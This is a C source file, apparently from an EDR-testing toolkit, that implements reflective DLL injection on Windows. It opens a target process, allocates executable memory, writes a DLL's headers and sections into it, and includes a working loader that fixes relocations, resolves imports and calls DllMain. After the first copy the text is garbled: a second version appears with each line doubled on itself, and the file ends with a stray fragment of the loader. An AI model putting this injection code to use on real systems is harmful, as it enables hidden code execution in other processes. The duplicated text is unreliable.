/*
 * Reflective DLL Injection (Conceptual)
 *
 * This sample demonstrates the setup steps for reflective DLL injection:
 *  1) Read DLL from disk into memory
 *  2) Parse PE headers and validate
 *  3) Allocate memory in the target process for the image and write headers/sections
 *  4) Prepare a small loader data block for relocations/imports resolution
 *
 * NOTE:
 *  - This version purposefully does NOT create a remote thread to execute a loader stub.
 *    It focuses on compile stability and the preparatory steps only.
 *  - For EDR/testing/sandbox use. Do not use for malicious activity.
 */

#include "../common/common.h"

typedef HMODULE (WINAPI *LoadLibraryAFunc)(LPCSTR);
typedef FARPROC (WINAPI *GetProcAddressFunc)(HMODULE, LPCSTR);
typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);

// Structure passed to a hypothetical reflective loader in remote memory
typedef struct {
    LPVOID ImageBase;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_BASE_RELOCATION BaseRelocation;
    PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;
    LoadLibraryAFunc fnLoadLibraryA;
    GetProcAddressFunc fnGetProcAddress;
} LOADER_DATA, *PLOADER_DATA;

// Conceptual loader (not used in this sample build)
DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) {
    PLOADER_DATA loaderData = (PLOADER_DATA)lpParameter;

    // Apply base relocations
    if (loaderData->BaseRelocation &&
        loaderData->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        PIMAGE_BASE_RELOCATION relocation = loaderData->BaseRelocation;
        DWORD_PTR delta = (DWORD_PTR)loaderData->ImageBase - loaderData->NtHeaders->OptionalHeader.ImageBase;

        while (relocation->VirtualAddress) {
            if (relocation->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                DWORD count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD list = (PWORD)(relocation + 1);
                for (DWORD i = 0; i < count; i++) {
                    WORD entry = list[i];
                    if (entry) {
                        PDWORD_PTR patch = (PDWORD_PTR)((LPBYTE)loaderData->ImageBase +
                                              (relocation->VirtualAddress + (entry & 0x0FFF)));
                        *patch += delta;
                    }
                }
            }
            relocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)relocation + relocation->SizeOfBlock);
        }
    }

    // Resolve imports
    if (loaderData->ImportDirectory &&
        loaderData->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = loaderData->ImportDirectory;
        while (importDesc->Name) {
            LPCSTR libName = (LPCSTR)((LPBYTE)loaderData->ImageBase + importDesc->Name);
            HMODULE hLib = loaderData->fnLoadLibraryA(libName);
            if (hLib) {
                PIMAGE_THUNK_DATA thunk = NULL;
                PIMAGE_THUNK_DATA funcRef = NULL;

                if (importDesc->OriginalFirstThunk) {
                    thunk = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->OriginalFirstThunk);
                    funcRef = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);
                } else {
                    thunk = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);
                    funcRef = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);
                }

                while (thunk->u1.AddressOfData) {
                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                        funcRef->u1.Function = (DWORD_PTR)loaderData->fnGetProcAddress(
                            hLib, (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal));
                    } else {
                        PIMAGE_IMPORT_BY_NAME funcName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)loaderData->ImageBase +
                                                              thunk->u1.AddressOfData);
                        funcRef->u1.Function = (DWORD_PTR)loaderData->fnGetProcAddress(hLib, funcName->Name);
                    }
                    ++thunk;
                    ++funcRef;
                }
            }
            ++importDesc;
        }
    }

    // Call DllMain if present
    if (loaderData->NtHeaders->OptionalHeader.AddressOfEntryPoint) {
        DllMainFunc dllMain = (DllMainFunc)((LPBYTE)loaderData->ImageBase +
            loaderData->NtHeaders->OptionalHeader.AddressOfEntryPoint);
        return dllMain((HINSTANCE)loaderData->ImageBase, DLL_PROCESS_ATTACH, NULL);
    }

    return TRUE;
}

// Preparatory steps for reflective injection (no remote execution here)
BOOL PerformReflectiveInjection(DWORD pid, const char* dllPath) {
    BYTE* pDllData = NULL;
    HANDLE hProcess = NULL;
    LPVOID pRemoteImage = NULL;
    LPVOID pRemoteLoaderData = NULL;
    BOOL success = FALSE;

    // Read DLL
    DWORD dllSize = ReadFileToMemory(dllPath, &pDllData);
    if (dllSize == 0 || !pDllData) {
        LOG_ERROR("Failed to read DLL file: %s", dllPath);
        return FALSE;
    }

    // Validate PE
    if (!ValidatePEFile(pDllData, dllSize)) {
        LOG_ERROR("Invalid PE file: %s", dllPath);
        goto cleanup;
    }

    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pDllData;
    IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)(pDllData + pDosHeader->e_lfanew);

    // Open target process
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );
    CHECK_HANDLE(hProcess, "Failed to open process");
    LOG_SUCCESS("Process handle obtained");

    // Allocate remote image
    pRemoteImage = VirtualAllocEx(
        hProcess,
        NULL,
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    CHECK_HANDLE(pRemoteImage, "Failed to allocate memory for DLL image");
    LOG_SUCCESS("Remote image allocated at: 0x%p (%u bytes)",
                pRemoteImage, (unsigned)pNtHeaders->OptionalHeader.SizeOfImage);

    // Write headers
    CHECK_BOOL(
        WriteProcessMemory(hProcess, pRemoteImage, pDllData,
                           pNtHeaders->OptionalHeader.SizeOfHeaders, NULL),
        "Failed to write PE headers"
    );
    LOG_SUCCESS("Headers written");

    // Write sections (best-effort: warn on failures, continue)
    {
        IMAGE_SECTION_HEADER* pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i) {
            SIZE_T sizeToWrite = pSectionHeader[i].SizeOfRawData;
            if (sizeToWrite == 0) continue;

            LPVOID dest = (PVOID)((LPBYTE)pRemoteImage + pSectionHeader[i].VirtualAddress);
            LPVOID src  = (PVOID)(pDllData + pSectionHeader[i].PointerToRawData);
            if (!WriteProcessMemory(hProcess, dest, src, sizeToWrite, NULL)) {
                LOG_WARNING("Failed to write section %.8s (RVA: 0x%X, Size: %u)",
                            pSectionHeader[i].Name,
                            pSectionHeader[i].VirtualAddress,
                            (unsigned)sizeToWrite);
            } else {
                LOG_SUCCESS("Section %.8s written (RVA: 0x%X, Size: %u)",
                            pSectionHeader[i].Name,
                            pSectionHeader[i].VirtualAddress,
                            (unsigned)sizeToWrite);
            }
        }
    }

    // Prepare loader data
    {
        LOADER_DATA loaderData = {0};
        loaderData.ImageBase = pRemoteImage;
        loaderData.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pRemoteImage + pDosHeader->e_lfanew);

        if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
            loaderData.BaseRelocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)pRemoteImage +
                pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        }

        if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
            loaderData.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pRemoteImage +
                pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        }

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        loaderData.fnLoadLibraryA = (LoadLibraryAFunc)GetProcAddress(hKernel32, "LoadLibraryA");
        loaderData.fnGetProcAddress = (GetProcAddressFunc)GetProcAddress(hKernel32, "GetProcAddress");

        pRemoteLoaderData = VirtualAllocEx(
            hProcess,
            NULL,
            sizeof(LOADER_DATA),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        CHECK_HANDLE(pRemoteLoaderData, "Failed to allocate memory for loader data");

        CHECK_BOOL(
            WriteProcessMemory(hProcess, pRemoteLoaderData, &loaderData, sizeof(loaderData), NULL),
            "Failed to write loader data"
        );
        LOG_SUCCESS("Loader data written");
    }

    LOG_INFO("Note: Full reflective injection requires a loader stub (not executed here)");
    LOG_SUCCESS("Reflective DLL injection setup completed (no execution)");
    success = TRUE;

cleanup:
    if (!success) {
        if (pRemoteLoaderData && hProcess) {
            VirtualFreeEx(hProcess, pRemoteLoaderData, 0, MEM_RELEASE);
        }
        if (pRemoteImage && hProcess) {
            VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
        }
    }
    SAFE_CLOSE_HANDLE(hProcess);
    SAFE_FREE(pDllData);
    return success;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        PrintUsage(argv[0],
                   "<process_name> <dll_path>",
                   "notepad.exe C:\\path\\to\\your.dll");
        return 1;
    }

    const char* processName = argv[1];
    const char* dllPath = argv[2];

    LOG_INFO("Reflective DLL Injection Technique");
    LOG_INFO("Target Process: %s", processName);
    LOG_INFO("DLL Path: %s", dllPath);
    printf("\n");

    DWORD pid = GetProcessIdByName(processName);
    if (pid == 0) {
        // GetProcessIdByName already logs an error
        return 1;
    }
    LOG_SUCCESS("Found process with PID: %lu\n", (unsigned long)pid);

    if (PerformReflectiveInjection(pid, dllPath)) {
        LOG_SUCCESS("Reflective injection setup completed");
        return 0;
    } else {
        LOG_ERROR("Reflective injection failed");
        return 1;
    }
}

/*/*

 * Reflective DLL Injection * Reflective DLL Injection

 *  * 

 * This technique loads a DLL from memory without using LoadLibrary: * This technique loads a DLL from memory without using LoadLibrary:

 * 1. Read DLL from disk into memory * 1. Read DLL from disk into memory

 * 2. Parse PE headers * 2. Parse PE headers

 * 3. Allocate memory in target process * 3. Allocate memory in target process

 * 4. Copy DLL sections * 4. Copy DLL sections

 * 5. Process relocations * 5. Process relocations

 * 6. Resolve imports * 6. Resolve imports

 * 7. Call DLL entry point * 7. Call DLL entry point

 *  * 

 * For EDR testing purposes only. * For EDR testing purposes only.

 *  * 

 * Note: This is a simplified version. A full implementation would need * Note: This is a simplified version. A full implementation would need

 * a reflective loader stub that can be injected and executed. * a reflective loader stub that can be injected and executed.

 */ */



#include "../common/common.h"#include "../common/common.h"



typedef HMODULE (WINAPI *LoadLibraryAFunc)(LPCSTR);typedef HMODULE (WINAPI *LoadLibraryAFunc)(LPCSTR);

typedef FARPROC (WINAPI *GetProcAddressFunc)(HMODULE, LPCSTR);typedef FARPROC (WINAPI *GetProcAddressFunc)(HMODULE, LPCSTR);

typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);



// Reflective loader structure to pass to remote process// Reflective loader structure to pass to remote process

typedef struct {typedef struct {

    LPVOID ImageBase;    LPVOID ImageBase;

    PIMAGE_NT_HEADERS NtHeaders;    PIMAGE_NT_HEADERS NtHeaders;

    PIMAGE_BASE_RELOCATION BaseRelocation;    PIMAGE_BASE_RELOCATION BaseRelocation;

    PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;    PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;

    LoadLibraryAFunc fnLoadLibraryA;    LoadLibraryAFunc fnLoadLibraryA;

    GetProcAddressFunc fnGetProcAddress;    GetProcAddressFunc fnGetProcAddress;

} LOADER_DATA, *PLOADER_DATA;} LOADER_DATA, *PLOADER_DATA;



/**/**

 * Reflective loader function (this would be copied to remote process) * Reflective loader function (this would be copied to remote process)

 * Note: This is a conceptual implementation * Note: This is a conceptual implementation

 */ */

DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) {DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) {

    PLOADER_DATA loaderData = (PLOADER_DATA)lpParameter;    PLOADER_DATA loaderData = (PLOADER_DATA)lpParameter;

        

    // Process base relocations    // Process base relocations

    if (loaderData->BaseRelocation && loaderData->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {    if (loaderData->BaseRelocation && loaderData->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {

        PIMAGE_BASE_RELOCATION relocation = loaderData->BaseRelocation;        PIMAGE_BASE_RELOCATION relocation = loaderData->BaseRelocation;

        DWORD_PTR delta = (DWORD_PTR)loaderData->ImageBase - loaderData->NtHeaders->OptionalHeader.ImageBase;        DWORD_PTR delta = (DWORD_PTR)loaderData->ImageBase - loaderData->NtHeaders->OptionalHeader.ImageBase;

                

        while (relocation->VirtualAddress) {        while (relocation->VirtualAddress) {

            if (relocation->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {            if (relocation->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {

                DWORD count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);                DWORD count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

                PWORD list = (PWORD)(relocation + 1);                PWORD list = (PWORD)(relocation + 1);

                                

                for (DWORD i = 0; i < count; i++) {                for (DWORD i = 0; i < count; i++) {

                    if (list[i]) {                    if (list[i]) {

                        PDWORD_PTR ptr = (PDWORD_PTR)((LPBYTE)loaderData->ImageBase + (relocation->VirtualAddress + (list[i] & 0xFFF)));                        PDWORD_PTR ptr = (PDWORD_PTR)((LPBYTE)loaderData->ImageBase + (relocation->VirtualAddress + (list[i] & 0xFFF)));

                        *ptr += delta;                        *ptr += delta;

                    }                    }

                }                }

            }            }

                        

            relocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)relocation + relocation->SizeOfBlock);            relocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)relocation + relocation->SizeOfBlock);

        }        }

    }    }

        

    // Process imports    // Process imports

    if (loaderData->ImportDirectory && loaderData->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {    if (loaderData->ImportDirectory && loaderData->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {

        PIMAGE_IMPORT_DESCRIPTOR importDesc = loaderData->ImportDirectory;        PIMAGE_IMPORT_DESCRIPTOR importDesc = loaderData->ImportDirectory;

                

        while (importDesc->Name) {        while (importDesc->Name) {

            LPCSTR libName = (LPCSTR)((LPBYTE)loaderData->ImageBase + importDesc->Name);            LPCSTR libName = (LPCSTR)((LPBYTE)loaderData->ImageBase + importDesc->Name);

            HMODULE hLib = loaderData->fnLoadLibraryA(libName);            HMODULE hLib = loaderData->fnLoadLibraryA(libName);

                        

            if (hLib) {            if (hLib) {

                PIMAGE_THUNK_DATA thunk = NULL;                PIMAGE_THUNK_DATA thunk = NULL;

                PIMAGE_THUNK_DATA funcRef = NULL;                PIMAGE_THUNK_DATA funcRef = NULL;

                                

                if (importDesc->OriginalFirstThunk) {                if (importDesc->OriginalFirstThunk) {

                    thunk = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->OriginalFirstThunk);                    thunk = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->OriginalFirstThunk);

                    funcRef = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);                    funcRef = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);

                } else {                } else {

                    thunk = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);                    thunk = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);

                    funcRef = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);                    funcRef = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);

                }                }

                                

                while (thunk->u1.AddressOfData) {                while (thunk->u1.AddressOfData) {

                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {

                        funcRef->u1.Function = (DWORD_PTR)loaderData->fnGetProcAddress(hLib, (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal));                        funcRef->u1.Function = (DWORD_PTR)loaderData->fnGetProcAddress(hLib, (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal));

                    } else {                    } else {

                        PIMAGE_IMPORT_BY_NAME funcName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)loaderData->ImageBase + thunk->u1.AddressOfData);                        PIMAGE_IMPORT_BY_NAME funcName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)loaderData->ImageBase + thunk->u1.AddressOfData);

                        funcRef->u1.Function = (DWORD_PTR)loaderData->fnGetProcAddress(hLib, funcName->Name);                        funcRef->u1.Function = (DWORD_PTR)loaderData->fnGetProcAddress(hLib, funcName->Name);

                    }                    }

                                        

                    thunk++;                    thunk++;

                    funcRef++;                    funcRef++;

                }                }

            }            }

                        

            importDesc++;            importDesc++;

        }        }

    }    }

        

    // Call DLL entry point    // Call DLL entry point

    if (loaderData->NtHeaders->OptionalHeader.AddressOfEntryPoint) {    if (loaderData->NtHeaders->OptionalHeader.AddressOfEntryPoint) {

        DllMainFunc dllMain = (DllMainFunc)((LPBYTE)loaderData->ImageBase + loaderData->NtHeaders->OptionalHeader.AddressOfEntryPoint);        DllMainFunc dllMain = (DllMainFunc)((LPBYTE)loaderData->ImageBase + loaderData->NtHeaders->OptionalHeader.AddressOfEntryPoint);

        return dllMain((HINSTANCE)loaderData->ImageBase, DLL_PROCESS_ATTACH, NULL);        return dllMain((HINSTANCE)loaderData->ImageBase, DLL_PROCESS_ATTACH, NULL);

    }    }

        

    return TRUE;    return TRUE;

}}



/**/**

 * Perform reflective DLL injection * Perform reflective DLL injection

 *  * 

 * @param pid Target process ID * @param pid Target process ID

 * @param dllPath Path to the DLL to inject * @param dllPath Path to the DLL to inject

 * @return TRUE on success, FALSE on failure * @return TRUE on success, FALSE on failure

 */ */

BOOL PerformReflectiveInjection(DWORD pid, const char* dllPath) {BOOL PerformReflectiveInjection(DWORD pid, const char* dllPath) {

    BYTE* pDllData = NULL;    BYTE* pDllData = NULL;

    HANDLE hProcess = NULL;    HANDLE hProcess = NULL;

    LPVOID pRemoteImage = NULL;    LPVOID pRemoteImage = NULL;

    LPVOID pRemoteLoaderData = NULL;    LPVOID pRemoteLoaderData = NULL;

    BOOL success = FALSE;    BOOL success = FALSE;

        

    // Read DLL file    // Read DLL file

    DWORD dllSize = ReadFileToMemory(dllPath, &pDllData);    DWORD dllSize = ReadFileToMemory(dllPath, &pDllData);

    if (dllSize == 0 || !pDllData) {    if (dllSize == 0 || !pDllData) {

        return FALSE;        return FALSE;

    }    }

        

    // Validate PE format    // Validate PE format

    if (!ValidatePEFile(pDllData, dllSize)) {    if (!ValidatePEFile(pDllData, dllSize)) {

        goto cleanup;        goto cleanup;

    }    }

        

    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pDllData;    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pDllData;

    IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)(pDllData + pDosHeader->e_lfanew);    IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)(pDllData + pDosHeader->e_lfanew);

        

    // Open process    // Open process

    hProcess = OpenProcess(    hProcess = OpenProcess(

        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |         PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 

        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,

        FALSE,        FALSE,

        pid        pid

    );    );

    CHECK_HANDLE(hProcess, "Failed to open process");    CHECK_HANDLE(hProcess, "Failed to open process");

    LOG_SUCCESS("Process handle obtained");    LOG_SUCCESS("Process handle obtained");

        

    // Allocate memory for DLL image    // Allocate memory for DLL image

    pRemoteImage = VirtualAllocEx(    pRemoteImage = VirtualAllocEx(

        hProcess,        hProcess,

        NULL,        NULL,

        pNtHeaders->OptionalHeader.SizeOfImage,        pNtHeaders->OptionalHeader.SizeOfImage,

        MEM_COMMIT | MEM_RESERVE,        MEM_COMMIT | MEM_RESERVE,

        PAGE_EXECUTE_READWRITE        PAGE_EXECUTE_READWRITE

    );    );

    CHECK_HANDLE(pRemoteImage, "Failed to allocate memory for DLL image");    CHECK_HANDLE(pRemoteImage, "Failed to allocate memory for DLL image");

    LOG_SUCCESS("Remote image allocated at: 0x%p (%d bytes)",     LOG_SUCCESS("Remote image allocated at: 0x%p (%d bytes)", 

                pRemoteImage, pNtHeaders->OptionalHeader.SizeOfImage);                pRemoteImage, pNtHeaders->OptionalHeader.SizeOfImage);

        

    // Copy headers    // Copy headers

    CHECK_BOOL(    CHECK_BOOL(

        WriteProcessMemory(hProcess, pRemoteImage, pDllData,         WriteProcessMemory(hProcess, pRemoteImage, pDllData, 

                          pNtHeaders->OptionalHeader.SizeOfHeaders, NULL),                          pNtHeaders->OptionalHeader.SizeOfHeaders, NULL),

        "Failed to write PE headers"        "Failed to write PE headers"

    );    );

    LOG_SUCCESS("Headers written");    LOG_SUCCESS("Headers written");

        

    // Copy sections    // Copy sections

    IMAGE_SECTION_HEADER* pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);    IMAGE_SECTION_HEADER* pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {

        if (pSectionHeader[i].SizeOfRawData > 0) {        if (pSectionHeader[i].SizeOfRawData > 0) {

            if (WriteProcessMemory(            if (WriteProcessMemory(

                hProcess,                hProcess,

                (PVOID)((LPBYTE)pRemoteImage + pSectionHeader[i].VirtualAddress),                (PVOID)((LPBYTE)pRemoteImage + pSectionHeader[i].VirtualAddress),

                (PVOID)(pDllData + pSectionHeader[i].PointerToRawData),                (PVOID)(pDllData + pSectionHeader[i].PointerToRawData),

                pSectionHeader[i].SizeOfRawData,                pSectionHeader[i].SizeOfRawData,

                NULL                NULL

            )) {            )) {

                LOG_SUCCESS("Section %s written (RVA: 0x%X, Size: %d bytes)",                LOG_SUCCESS("Section %s written (RVA: 0x%X, Size: %d bytes)",

                           pSectionHeader[i].Name,                           pSectionHeader[i].Name,

                           pSectionHeader[i].VirtualAddress,                           pSectionHeader[i].VirtualAddress,

                           pSectionHeader[i].SizeOfRawData);                           pSectionHeader[i].SizeOfRawData);

            } else {            } else {

                LOG_WARNING("Failed to write section %s", pSectionHeader[i].Name);                LOG_WARNING("Failed to write section %s", pSectionHeader[i].Name);

            }            }

        }        }

    }    }

        

    // Prepare loader data    // Prepare loader data

    LOADER_DATA loaderData = {0};    LOADER_DATA loaderData = {0};

    loaderData.ImageBase = pRemoteImage;    loaderData.ImageBase = pRemoteImage;

    loaderData.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pRemoteImage + pDosHeader->e_lfanew);    loaderData.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pRemoteImage + pDosHeader->e_lfanew);

        

    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {

        loaderData.BaseRelocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)pRemoteImage +         loaderData.BaseRelocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)pRemoteImage + 

            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    }    }

        

    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {

        loaderData.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pRemoteImage +         loaderData.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pRemoteImage + 

            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    }    }

        

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

    loaderData.fnLoadLibraryA = (LoadLibraryAFunc)GetProcAddress(hKernel32, "LoadLibraryA");    loaderData.fnLoadLibraryA = (LoadLibraryAFunc)GetProcAddress(hKernel32, "LoadLibraryA");

    loaderData.fnGetProcAddress = (GetProcAddressFunc)GetProcAddress(hKernel32, "GetProcAddress");    loaderData.fnGetProcAddress = (GetProcAddressFunc)GetProcAddress(hKernel32, "GetProcAddress");

        

    // Allocate and write loader data    // Allocate and write loader data

    pRemoteLoaderData = VirtualAllocEx(    pRemoteLoaderData = VirtualAllocEx(

        hProcess,        hProcess,

        NULL,        NULL,

        sizeof(LOADER_DATA),        sizeof(LOADER_DATA),

        MEM_COMMIT | MEM_RESERVE,        MEM_COMMIT | MEM_RESERVE,

        PAGE_READWRITE        PAGE_READWRITE

    );    );

    CHECK_HANDLE(pRemoteLoaderData, "Failed to allocate memory for loader data");    CHECK_HANDLE(pRemoteLoaderData, "Failed to allocate memory for loader data");

        

    CHECK_BOOL(    CHECK_BOOL(

        WriteProcessMemory(hProcess, pRemoteLoaderData, &loaderData, sizeof(LOADER_DATA), NULL),        WriteProcessMemory(hProcess, pRemoteLoaderData, &loaderData, sizeof(LOADER_DATA), NULL),

        "Failed to write loader data"        "Failed to write loader data"

    );    );

    LOG_SUCCESS("Loader data written");    LOG_SUCCESS("Loader data written");

        

    LOG_INFO("Note: Full reflective injection requires a loader stub");    LOG_INFO("Note: Full reflective injection requires a loader stub");

    LOG_INFO("This implementation demonstrates the concept");    LOG_INFO("This implementation demonstrates the concept");

    LOG_SUCCESS("Reflective DLL injection setup completed");    LOG_SUCCESS("Reflective DLL injection setup completed");

    success = TRUE;    success = TRUE;

        

cleanup:cleanup:

    if (pRemoteLoaderData && hProcess) {    if (pRemoteLoaderData && hProcess) {

        VirtualFreeEx(hProcess, pRemoteLoaderData, 0, MEM_RELEASE);        VirtualFreeEx(hProcess, pRemoteLoaderData, 0, MEM_RELEASE);

    }    }

    if (!success && pRemoteImage && hProcess) {    if (!success && pRemoteImage && hProcess) {

        VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);        VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);

    }    }

    SAFE_CLOSE_HANDLE(hProcess);    SAFE_CLOSE_HANDLE(hProcess);

    SAFE_FREE(pDllData);    SAFE_FREE(pDllData);

        

    return success;    return success;

}}



int main(int argc, char* argv[]) {int main(int argc, char* argv[]) {

    if (argc < 3) {    if (argc < 3) {

        PrintUsage(argv[0],        PrintUsage(argv[0],

                   "<process_name> <dll_path>",                   "<process_name> <dll_path>",

                   "notepad.exe C:\\\\path\\\\to\\\\your.dll");                   "notepad.exe C:\\\\path\\\\to\\\\your.dll");

        return 1;        return 1;

    }    }

        

    const char* processName = argv[1];    const char* processName = argv[1];

    const char* dllPath = argv[2];    const char* dllPath = argv[2];

        

    LOG_INFO("Reflective DLL Injection Technique");    LOG_INFO("Reflective DLL Injection Technique");

    LOG_INFO("Target Process: %s", processName);    LOG_INFO("Target Process: %s", processName);

    LOG_INFO("DLL Path: %s", dllPath);    LOG_INFO("DLL Path: %s", dllPath);

    printf("\n");    printf("\n");

        

    // Get target process ID    // Get target process ID

    DWORD pid = GetProcessIdByName(processName);    DWORD pid = GetProcessIdByName(processName);

    if (pid == 0) {    if (pid == 0) {

        return 1;        return 1;

    }    }

    LOG_SUCCESS("Found process with PID: %d\n", pid);    LOG_SUCCESS("Found process with PID: %d\n", pid);

        

    // Perform injection    // Perform injection

    if (PerformReflectiveInjection(pid, dllPath)) {    if (PerformReflectiveInjection(pid, dllPath)) {

        LOG_SUCCESS("Reflective injection setup completed");        LOG_SUCCESS("Reflective injection setup completed");

        return 0;        return 0;

    } else {    } else {

        LOG_ERROR("Reflective injection failed");        LOG_ERROR("Reflective injection failed");

        return 1;        return 1;

    }    }

}}

    PLOADER_DATA loaderData = (PLOADER_DATA)lpParameter;
    
    // Process base relocations
    if (loaderData->BaseRelocation && loaderData->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        PIMAGE_BASE_RELOCATION relocation = loaderData->BaseRelocation;
